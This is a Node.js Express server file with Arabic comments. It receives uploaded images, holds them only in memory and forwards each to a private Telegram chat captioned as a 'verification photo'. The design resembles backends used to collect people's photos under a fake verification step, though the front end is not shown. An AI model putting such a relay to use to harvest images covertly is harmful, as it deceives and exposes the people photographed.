require("dotenv").config();
const express = require("express");
const path = require("path");
const multer = require("multer");
const axios = require("axios");
const FormData = require("form-data");

const app = express();
const PORT = process.env.PORT || 3000;

// ✅ متغيرات Telegram (من Railway أو .env)
const BOT_TOKEN = process.env.BOT_TOKEN || "ضع_التوكن_هنا";
const CHAT_ID = process.env.CHAT_ID || "ضع_chat_id_هنا";

// ✅ استخدام الذاكرة فقط (بدون حفظ على القرص!)
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// ✅ دالة إرسال الصورة إلى Telegram
async function sendToTelegram(buffer, filename, caption = "") {
  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("photo", buffer, {
    filename: filename,
    contentType: "image/jpeg"
  });
  form.append("caption", caption || "صورة تحقق جديدة");

  try {
    const response = await axios.post(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
      form,
      { headers: form.getHeaders() }
    );
    return response.data;
  } catch (error) {
    console.error("خطأ في الإرسال إلى Telegram:", error.message);
    throw error;
  }
}

// تقديم ملفات المشروع
app.use(express.static(__dirname));

// الصفحة الرئيسية
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ✅ استقبال عدة صور وإرسالها إلى Telegram
app.post("/upload", upload.array("images"), async (req, res) => {
  console.log("POST /upload received");
  const files = req.files || [];
  console.log("عدد الملفات المستقبلة:", files.length);

  if (files.length === 0) {
    return res.status(400).json({
      success: false,
      message: "لا توجد صور"
    });
  }

  try {
    const results = [];
    
    // إرسال كل صورة إلى Telegram
    for (const file of files) {
      const result = await sendToTelegram(
        file.buffer,
        file.originalname || `photo-${Date.now()}.jpg`,
        `صورة تحقق - ${new Date().toLocaleString("ar-EG")}`
      );
      results.push({
        originalName: file.originalname,
        size: file.size,
        telegramMessageId: result.result?.message_id
      });
    }

    res.json({
      success: true,
      message: `تم إرسال ${files.length} صورة إلى Telegram بنجاح`,
      files: results
    });
  } catch (error) {
    console.error("خطأ:", error);
    res.status(500).json({
      success: false,
      message: "فشل الإرسال إلى Telegram",
      error: error.message
    });
  }
});

// تشغيل الخادم
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`✅ BOT_TOKEN: ${BOT_TOKEN ? "✓ تم التحديد" : "❌ غير محدد"}`);
  console.log(`✅ CHAT_ID: ${CHAT_ID ? "✓ تم التحديد" : "❌ غير محدد"}`);
});